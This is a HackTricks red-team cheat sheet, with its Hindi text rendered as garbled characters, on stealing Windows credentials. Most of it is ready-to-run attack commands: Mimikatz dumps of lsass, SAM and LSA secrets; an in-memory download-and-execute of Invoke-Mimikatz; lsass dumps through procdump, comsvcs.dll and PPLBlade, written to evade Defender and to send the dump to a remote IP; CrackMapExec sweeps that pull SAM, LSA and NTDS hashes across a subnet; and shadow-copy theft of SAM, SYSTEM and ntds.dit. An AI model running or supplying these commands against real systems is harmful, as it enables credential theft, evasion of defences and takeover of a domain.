# Stealing Windows Credentials

<details>

<summary><strong>рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХреЛ рд╕рдорд░реНрдерди рджреЗрдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк **HackTricks рдореЗрдВ рдЕрдкрдиреА рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд╛ рд╕рдВрдЧреНрд░рд╣
* **ЁЯТм Discord рд╕рдореВрд╣** [**рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **Twitter** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks_live) рдкрд░ **рдлреЙрд▓реЛ рдХрд░реЗрдВ**ред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Mimikatz рдФрд░ рдХреНрдпрд╛ рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдпрд╣ рдЬрд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП** [**рдЗрд╕ рдкреЗрдЬ**](credentials-mimikatz.md)** рдкрд░ рдЬрд╛рдПрдВред**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**рдХреБрдЫ рд╕рдВрднрд╛рд╡рд┐рдд рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рд╕реБрд░рдХреНрд╖рд╛ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдпрд╣рд╛рдБ рдЬрд╛рдиреЗрдВред**](credentials-protections.md) **рдпрд╣ рд╕реБрд░рдХреНрд╖рд╛ Mimikatz рдХреЛ рдХреБрдЫ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдирд┐рдХрд╛рд▓рдиреЗ рд╕реЗ рд░реЛрдХ рд╕рдХрддреА рд╣реИред**

## Meterpreter рдХреЗ рд╕рд╛рде рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕

[**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдЬреЛ** рдореИрдВрдиреЗ **рдкреАрдбрд╝рд┐рдд рдХреЗ рдЕрдВрджрд░ рдкрд╛рд╕рд╡рд░реНрдб рдФрд░ рд╣реИрд╢ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП** рдмрдирд╛рдпрд╛ рд╣реИред
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Bypassing AV

### Procdump + Mimikatz

рдЪреВрдВрдХрд┐ **Procdump** [**SysInternals**](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) **рд╕реЗ рдПрдХ рд╡реИрдз Microsoft рдЯреВрд▓ рд╣реИ**, рдЗрд╕реЗ Defender рджреНрд╡рд╛рд░рд╛ рдирд╣реАрдВ рдкрд╣рдЪрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИред\
рдЖрдк рдЗрд╕ рдЯреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ **lsass рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдбрдВрдк рдХрд░рдиреЗ**, **рдбрдВрдк рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ** рдФрд░ **рд╕реНрдерд╛рдиреАрдп рд░реВрдк рд╕реЗ рдбрдВрдк рд╕реЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдирд┐рдХрд╛рд▓рдиреЗ** рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

{% code title="Dump lsass" %}
```bash
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
{% endcode %}

{% code title="Extract credentials from the dump" %}

{% endcode %}

{% code title="Extract credentials from the dump" %}
```c
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
{% endcode %}

рдпрд╣ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ [SprayKatz](https://github.com/aas-n/spraykatz) рдХреЗ рд╕рд╛рде рдХреА рдЬрд╛рддреА рд╣реИ: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**рдиреЛрдЯ**: рдХреБрдЫ **AV** **procdump.exe рд╕реЗ lsass.exe рдХреЛ dump** рдХрд░рдиреЗ рдХреЗ рдЙрдкрдпреЛрдЧ рдХреЛ **malicious** рдХреЗ рд░реВрдк рдореЗрдВ **detect** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдХреНрдпреЛрдВрдХрд┐ рд╡реЗ **"procdump.exe" рдФрд░ "lsass.exe"** рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЛ **detect** рдХрд░ рд░рд╣реЗ рд╣реИрдВред рдЗрд╕рд▓рд┐рдП **procdump** рдХреЛ **lsass.exe рдХреЗ рдирд╛рдо** рдХреЗ рдмрдЬрд╛рдп **lsass.exe рдХреЗ PID** рдХреЛ **argument** рдХреЗ рд░реВрдк рдореЗрдВ **pass** рдХрд░рдирд╛ **stealthier** рд╣реИред

### **comsvcs.dll** рдХреЗ рд╕рд╛рде lsass рдХреЛ dump рдХрд░рдирд╛

`C:\Windows\System32` рдореЗрдВ рдкрд╛рдИ рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рдПрдХ DLL рдЬрд┐рд╕рдХрд╛ рдирд╛рдо **comsvcs.dll** рд╣реИ, **рдХреНрд░реИрд╢ рдХреА рд╕реНрдерд┐рддрд┐ рдореЗрдВ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдореЛрд░реА рдХреЛ dump** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЬрд┐рдореНрдореЗрджрд╛рд░ рд╣реИред рдЗрд╕ DLL рдореЗрдВ рдПрдХ **function** рд╣реИ рдЬрд┐рд╕рдХрд╛ рдирд╛рдо **`MiniDumpW`** рд╣реИ, рдЬрд┐рд╕реЗ `rundll32.exe` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред\
рдкрд╣рд▓реЗ рджреЛ рддрд░реНрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдЕрдкреНрд░рд╛рд╕рдВрдЧрд┐рдХ рд╣реИ, рд▓реЗрдХрд┐рди рддреАрд╕рд░рд╛ рддреАрди рдШрдЯрдХреЛрдВ рдореЗрдВ рд╡рд┐рднрд╛рдЬрд┐рдд рд╣реИред dump рдХреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рдкреНрд░рдХреНрд░рд┐рдпрд╛ ID рдкрд╣рд▓рд╛ рдШрдЯрдХ рд╣реИ, dump рдлрд╝рд╛рдЗрд▓ рдХрд╛ рд╕реНрдерд╛рди рджреВрд╕рд░рд╛ рдШрдЯрдХ рд╣реИ, рдФрд░ рддреАрд╕рд░рд╛ рдШрдЯрдХ рдХреЗрд╡рд▓ рд╢рдмреНрдж **full** рд╣реИред рдХреЛрдИ рд╡реИрдХрд▓реНрдкрд┐рдХ рд╡рд┐рдХрд▓реНрдк рдирд╣реАрдВ рд╣реИрдВред\
рдЗрди рддреАрди рдШрдЯрдХреЛрдВ рдХреЛ рдкрд╛рд░реНрд╕ рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж, DLL dump рдлрд╝рд╛рдЗрд▓ рдмрдирд╛рдиреЗ рдФрд░ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреА рдореЗрдореЛрд░реА рдХреЛ рдЗрд╕ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд╕реНрдерд╛рдирд╛рдВрддрд░рд┐рдд рдХрд░рдиреЗ рдореЗрдВ рд╕рдВрд▓рдЧреНрди рд╣реИред\
**comsvcs.dll** рдХрд╛ рдЙрдкрдпреЛрдЧ lsass рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ dump рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ procdump рдХреЛ рдЕрдкрд▓реЛрдб рдФрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╕рдорд╛рдкреНрдд рд╣реЛ рдЬрд╛рддреА рд╣реИред рдЗрд╕ рд╡рд┐рдзрд┐ рдХрд╛ рд╡рд┐рд╡рд░рдг [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords) рдкрд░ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрди рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**рдЖрдк рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ** [**lssasy**](https://github.com/Hackndo/lsassy)**рдХреЗ рд╕рд╛рде рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред**

### **Task Manager рдХреЗ рд╕рд╛рде lsass рдбрдВрдк рдХрд░рдирд╛**

1. Task Bar рдкрд░ рд░рд╛рдЗрдЯ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ рдФрд░ Task Manager рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ
2. More details рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ
3. Processes рдЯреИрдм рдореЗрдВ "Local Security Authority Process" рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдЦреЛрдЬреЗрдВ
4. "Local Security Authority Process" рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдкрд░ рд░рд╛рдЗрдЯ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ рдФрд░ "Create dump file" рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред

### procdump рдХреЗ рд╕рд╛рде lsass рдбрдВрдк рдХрд░рдирд╛

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) рдПрдХ Microsoft рд╕рд╛рдЗрди рдХрд┐рдпрд╛ рд╣реБрдЖ рдмрд╛рдЗрдирд░реА рд╣реИ рдЬреЛ [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) рд╕реВрдЯ рдХрд╛ рд╣рд┐рд╕реНрд╕рд╛ рд╣реИред
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass with PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) рдПрдХ Protected Process Dumper Tool рд╣реИ рдЬреЛ рдореЗрдореЛрд░реА рдбрдВрдк рдХреЛ рдЕрд╕реНрдкрд╖реНрдЯ рдХрд░рдиреЗ рдФрд░ рдЗрд╕реЗ рд░рд┐рдореЛрдЯ рд╡рд░реНрдХрд╕реНрдЯреЗрд╢рдиреЛрдВ рдкрд░ рдЯреНрд░рд╛рдВрд╕рдлрд░ рдХрд░рдиреЗ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИ рдмрд┐рдирд╛ рдЗрд╕реЗ рдбрд┐рд╕реНрдХ рдкрд░ рдбрд╛рд▓реЗред

**рдореБрдЦреНрдп рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛рдПрдБ**:

1. PPL рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдирд╛
2. рдореЗрдореЛрд░реА рдбрдВрдк рдлрд╛рдЗрд▓реЛрдВ рдХреЛ рдЕрд╕реНрдкрд╖реНрдЯ рдХрд░рдирд╛ рддрд╛рдХрд┐ Defender рд╕рд┐рдЧреНрдиреЗрдЪрд░-рдЖрдзрд╛рд░рд┐рдд рдбрд┐рдЯреЗрдХреНрд╢рди рдореИрдХреЗрдирд┐рдЬреНрдо рд╕реЗ рдмрдЪрд╛ рдЬрд╛ рд╕рдХреЗ
3. RAW рдФрд░ SMB рдЕрдкрд▓реЛрдб рд╡рд┐рдзрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рдореЗрдореЛрд░реА рдбрдВрдк рдХреЛ рдЕрдкрд▓реЛрдб рдХрд░рдирд╛ рдмрд┐рдирд╛ рдЗрд╕реЗ рдбрд┐рд╕реНрдХ рдкрд░ рдбрд╛рд▓реЗ (fileless dump)

{% code overflow="wrap" %}
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
{% endcode %}

## CrackMapExec

### Dump SAM hashes

### SAM рд╣реИрд╢ рдбрдВрдк рдХрд░реЗрдВ
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### LSA рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдбрдВрдк рдХрд░реЗрдВ

LSA (Local Security Authority) рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдореЗрдВ рдкрд╛рд╕рд╡рд░реНрдб, NTLM рд╣реИрд╢, рдФрд░ рдЕрдиреНрдп рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рд╣реЛрддреА рд╣реИред рдЗрдиреНрд╣реЗрдВ рдбрдВрдк рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддрд░реАрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

#### Mimikatz

Mimikatz рдПрдХ рдкреНрд░рд╕рд┐рджреНрдз рдЯреВрд▓ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ LSA рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдХреЛ рдбрдВрдк рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдХреЗ рд╕рд╛рде рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ:

```shell
mimikatz # sekurlsa::logonpasswords
```

#### Windows Credential Editor (WCE)

WCE рдПрдХ рдФрд░ рдЯреВрд▓ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ LSA рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдХреЛ рдбрдВрдк рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдХреЗ рд╕рд╛рде рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ:

```shell
wce -w
```

#### Invoke-DumpCreds

PowerShell рдХреЗ рд╕рд╛рде, рдЖрдк `Invoke-DumpCreds` рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

```powershell
Invoke-DumpCreds
```

### SAM рдФрд░ SYSTEM рд░рдЬрд┐рд╕реНрдЯреНрд░реА рд╣рд╛рдЗрд╡реНрд╕ рдбрдВрдк рдХрд░реЗрдВ

SAM рдФрд░ SYSTEM рд░рдЬрд┐рд╕реНрдЯреНрд░реА рд╣рд╛рдЗрд╡реНрд╕ рдореЗрдВ рдкрд╛рд╕рд╡рд░реНрдб рд╣реИрд╢ рд╣реЛрддреЗ рд╣реИрдВред рдЗрдиреНрд╣реЗрдВ рдбрдВрдк рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддрд░реАрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

#### рд░рдЬрд┐рд╕реНрдЯреНрд░реА рд╣рд╛рдЗрд╡реНрд╕ рдХреЛ рдПрдХреНрд╕рдкреЛрд░реНрдЯ рдХрд░реЗрдВ

рдЖрдк рд░рдЬрд┐рд╕реНрдЯреНрд░реА рд╣рд╛рдЗрд╡реНрд╕ рдХреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдХреЗ рд╕рд╛рде рдПрдХреНрд╕рдкреЛрд░реНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

```shell
reg save hklm\sam sam.save
reg save hklm\system system.save
```

#### bkhive рдФрд░ samdump2

рдПрдХреНрд╕рдкреЛрд░реНрдЯ рдХреА рдЧрдИ рдлрд╛рдЗрд▓реЛрдВ рд╕реЗ рдкрд╛рд╕рд╡рд░реНрдб рд╣реИрд╢ рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдк `bkhive` рдФрд░ `samdump2` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

```shell
bkhive system.save key
samdump2 sam.save key
```

### Cached Credentials рдбрдВрдк рдХрд░реЗрдВ

Windows рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ Cached Credentials рдХреЛ рдбрдВрдк рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддрд░реАрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

#### Mimikatz

Mimikatz рдХрд╛ рдЙрдкрдпреЛрдЧ Cached Credentials рдХреЛ рдбрдВрдк рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рднреА рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:

```shell
mimikatz # sekurlsa::logonpasswords
```

#### Cachedump

Cachedump рдПрдХ рдФрд░ рдЯреВрд▓ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ Cached Credentials рдХреЛ рдбрдВрдк рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:

```shell
cachedump
```

### рдирд┐рд╖реНрдХрд░реНрд╖

Windows рд╕рд┐рд╕реНрдЯрдо рд╕реЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЛ рдбрдВрдк рдХрд░рдиреЗ рдХреЗ рдХрдИ рддрд░реАрдХреЗ рд╣реИрдВред рдЙрдкрд░реЛрдХреНрдд рдЯреВрд▓реНрд╕ рдФрд░ рддрдХрдиреАрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рдЖрдк LSA рд╕реАрдХреНрд░реЗрдЯреНрд╕, SAM рдФрд░ SYSTEM рд░рдЬрд┐рд╕реНрдЯреНрд░реА рд╣рд╛рдЗрд╡реНрд╕, рдФрд░ Cached Credentials рдХреЛ рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ рдбрдВрдк рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### рд▓рдХреНрд╖реНрдп DC рд╕реЗ NTDS.dit рдбрдВрдк рдХрд░реЗрдВ
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### рд▓рдХреНрд╖реНрдп DC рд╕реЗ NTDS.dit рдкрд╛рд╕рд╡рд░реНрдб рдЗрддрд┐рд╣рд╛рд╕ рдбрдВрдк рдХрд░реЗрдВ
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### рдкреНрд░рддреНрдпреЗрдХ NTDS.dit рдЦрд╛рддреЗ рдХреЗ рд▓рд┐рдП pwdLastSet attribute рджрд┐рдЦрд╛рдПрдВ

```shell
dsquery * -filter "(&(objectCategory=person)(objectClass=user))" -attr samAccountName pwdLastSet
```

рдпрд╣ рдХрдорд╛рдВрдб рдкреНрд░рддреНрдпреЗрдХ NTDS.dit рдЦрд╛рддреЗ рдХреЗ рд▓рд┐рдП `pwdLastSet` attribute рджрд┐рдЦрд╛рдПрдЧрд╛ред
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

рдпреЗ рдлрд╛рдЗрд▓реЗрдВ _C:\windows\system32\config\SAM_ рдФрд░ _C:\windows\system32\config\SYSTEM_ рдореЗрдВ **рд╕реНрдерд┐рдд** рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдПред рд▓реЗрдХрд┐рди **рдЖрдк рдЗрдиреНрд╣реЗрдВ рд╕рд╛рдорд╛рдиреНрдп рддрд░реАрдХреЗ рд╕реЗ рдХреЙрдкреА рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ** рдХреНрдпреЛрдВрдХрд┐ рдпреЗ рд╕рдВрд░рдХреНрд╖рд┐рдд рд╣реИрдВред

### Registry рд╕реЗ

рдЗрди рдлрд╛рдЗрд▓реЛрдВ рдХреЛ рдЪреБрд░рд╛рдиреЗ рдХрд╛ рд╕рдмрд╕реЗ рдЖрд╕рд╛рди рддрд░реАрдХрд╛ рд╣реИ рдХрд┐ рд░рдЬрд┐рд╕реНрдЯреНрд░реА рд╕реЗ рдПрдХ рдХреЙрдкреА рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Download** рдЙрди рдлрд╛рдЗрд▓реЛрдВ рдХреЛ рдЕрдкрдиреА Kali рдорд╢реАрди рдкрд░ рдФрд░ **hashes рдХреЛ extract рдХрд░реЗрдВ** рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

рдЖрдк рдЗрд╕ рд╕реЗрд╡рд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕рдВрд░рдХреНрд╖рд┐рдд рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреА рдкреНрд░рддрд┐рд▓рд┐рдкрд┐ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ Administrator рд╣реЛрдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИред

#### vssadmin рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛

vssadmin рдмрд╛рдЗрдирд░реА рдХреЗрд╡рд▓ Windows Server рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдореЗрдВ рдЙрдкрд▓рдмреНрдз рд╣реИред
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
рд▓реЗрдХрд┐рди рдЖрдк **Powershell** рд╕реЗ рднреА рд╡рд╣реА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрд╣ **SAM рдлрд╛рдЗрд▓ рдХреЛ рдХреЙрдкреА рдХрд░рдиреЗ рдХрд╛ рдПрдХ рдЙрджрд╛рд╣рд░рдг** рд╣реИ (рдпрд╣рд╛рдВ рдЙрдкрдпреЛрдЧ рдХреА рдЧрдИ рд╣рд╛рд░реНрдб рдбреНрд░рд╛рдЗрд╡ "C:" рд╣реИ рдФрд░ рдЗрд╕реЗ C:\users\Public рдореЗрдВ рд╕реЗрд╡ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ) рд▓реЗрдХрд┐рди рдЖрдк рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рд╕реА рднреА рдкреНрд░реЛрдЯреЗрдХреНрдЯреЗрдб рдлрд╛рдЗрд▓ рдХреЛ рдХреЙрдкреА рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
### Invoke-NinjaCopy

рдЕрдВрдд рдореЗрдВ, рдЖрдк [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ SAM, SYSTEM рдФрд░ ntds.dit рдХреА рдПрдХ рдкреНрд░рддрд┐ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВред
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

